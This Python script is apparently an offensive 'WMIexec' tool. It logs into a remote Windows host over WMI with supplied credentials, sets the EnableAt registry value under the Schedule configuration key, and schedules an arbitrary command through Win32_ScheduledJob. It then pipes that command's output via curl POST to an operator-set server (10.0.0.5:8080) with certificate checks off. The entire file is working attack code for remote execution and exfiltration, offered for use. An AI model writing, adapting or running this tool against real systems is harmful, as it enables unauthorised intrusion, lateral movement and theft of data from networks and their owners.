import wmi
import datetime
import argparse

webserver = "https://10.0.0.5:8080" #change to your HTTP server IP and port where you will get the output

class WMIAgent:
    def __init__(self, c, hostname, username, password, command):
        self.c = c
        self.hostname = hostname
        self.username = username
        self.password = password
        self.command = command

    def modify_registry(self):
        # Define the registry key information
        key_path = 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Configuration'
        key_name = 'EnableAt'
        key_type = 'REG_DWORD'
        key_value = 1

        # Check if the registry key exists
        try:
            registry = c.StdRegProv
            result, registries, _ = registry.EnumValues(
                hDefKey=0x80000002,
                sSubKeyName=key_path
            )

            if str(key_name) in str(registries):
                print(f"[+] Registry key '{key_name}' already exists. Executing command...")
                return
        except wmi.x_wmi as e:
            # Registry key doesn't exist, proceed with modification
            print(f"[-] Registry key '{key_name}' does not exist. Proceeding with modification...")

        # Modify the registry key value
        try:
            result = registry.SetDWORDValue(
                hDefKey=0x80000002,
                sSubKeyName=key_path,
                sValueName=key_name,
                uValue=key_value
            )
            
            print(f"[+] Registry key '{key_name}' created successfully.")

        except wmi.x_wmi as e:
            print(f"[-] Failed to modify registry key: {e}")
            exit(1)

    def execute_command_wmi(self):        
        # Calculate the begin time for the scheduled job (1 minute from now)
        change_date_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
        print("[+] Command will be executed on " + str(change_date_time))
        begin_time = change_date_time.strftime('%Y%m%d%H%M%S.000000+100')

        # Use the Win32_ScheduledJob class to execute the command
        job_id, result = c.Win32_ScheduledJob.Create(Command=self.command, StartTime=begin_time)

        if result == 0:
            print(f"[+] Command executed successfully. Job ID: {job_id}\n")
        else:
            print("[-] Failed to execute command.\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Custom WMIexec script created by @kleiton0x7e')
    parser.add_argument('-i', '--ip', action='store', required = True, help='The IP address/ hostname of the server')
    parser.add_argument('-u', '--username', action='store', required = True, help='The username used for authentication')
    parser.add_argument('-p', '--password', action='store', required = True, help='The password used for authentication')
    parser.add_argument('-c', '--command', action='store', required = True, help='The command to be executed')
    args = parser.parse_args()

    #connect to WMI instance
    try:
        c = wmi.WMI(
                computer=args.ip,
                user=args.username,
                password=args.password,
                namespace="root\\cimv2"
            )
        print("[+] Connected to " + args.ip + "\\root\\cimv2\n")
    except wmi.x_wmi as e:
        print(f"Failed to connect to the remote WMI namespace: {e}")
        exit(0)

    #Initialize the agent
    agent = WMIAgent(c, args.ip, args.username, args.password, "cmd /Q /c " + args.command + " | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- " + webserver)

    agent.modify_registry()
    agent.execute_command_wmi()
